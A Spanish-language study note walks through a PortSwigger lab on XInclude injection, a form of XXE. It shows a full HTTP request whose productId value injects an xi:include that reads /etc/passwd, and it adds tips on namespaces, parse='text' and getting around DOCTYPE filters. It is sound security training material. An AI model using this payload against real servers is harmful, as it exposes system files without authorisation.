---
aliases:
  - XXE - XInclude sin controlar el XML
  - xinclude attack
  - xxe api rest xinclude
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — XInclude (cuando NO controlás el XML entero)

> Lab: [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

**Qué demuestra:** tu input es **solo un valor** que el server mete dentro de **su propio XML** (típico API REST/SOAP). No podés poner `<!DOCTYPE>` ni entidades (no controlás el documento). Solución: **XInclude**, que se inyecta a nivel de valor.

## Vector completo

Acá la request **no** es XML: es `application/x-www-form-urlencoded`. El server toma `productId` y lo arma en un XML por detrás.

```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 145

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

Es decir, el **valor** de `productId` pasa a ser:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Verificación
La respuesta refleja el contenido de `/etc/passwd`. 

## Detalles que se pasan por alto
- **`Content-Type` acá es `x-www-form-urlencoded`** (¡no XML!). Editás el **valor del parámetro** `productId`, no el body entero. Esa es toda la diferencia con [[vulnerabilities/006-xxe/examples/leer-archivo-in-band|in-band]].
- Hace falta declarar el **namespace** `xmlns:xi="http://www.w3.org/2001/XInclude"` en el elemento raíz, o el `xi:include` no se procesa.
- `parse="text"` para leer archivos como texto plano (si no, intenta parsearlo como XML y falla con `/etc/passwd`).
- Si un endpoint manda XML pero **no** te deja poner DOCTYPE (lo filtra), XInclude también sirve como bypass.
